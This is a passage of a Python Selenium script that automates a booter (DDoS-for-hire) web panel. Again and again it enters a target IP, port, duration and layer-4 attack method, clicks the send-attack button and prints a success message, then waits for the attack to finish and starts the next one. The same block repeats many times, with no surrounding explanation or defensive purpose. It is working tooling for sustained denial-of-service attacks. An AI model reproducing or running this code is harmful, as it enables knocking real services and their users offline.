shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
port_box.send_keys(port_input)

time_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[2]')
time_box.send_keys(seconds_input)

dropdown = driver.find_element_by_xpath('//*[@id="layer4"]/div[2]/select')
drp=Select(dropdown)
drp.select_by_visible_text(method)
time.sleep(2)
send_attack = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/button')
send_attack.click()

shownip = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[2]/code')
port = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[3]')
seconds = driver.find_element_by_xpath('//*[@id="allattackstbl"]/tbody/tr[2]/td[5]')

print('Sent attack succesfully to', shownip.text, 'using port', port.text, 'for', seconds_input, "seconds.")
print('')
time.sleep(int(seconds_input))
ip_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/input')
ip_box.send_keys(ip)

port_box = driver.find_element_by_xpath('//*[@id="booter"]/div[2]/form/div[2]/div[1]/input[1]')
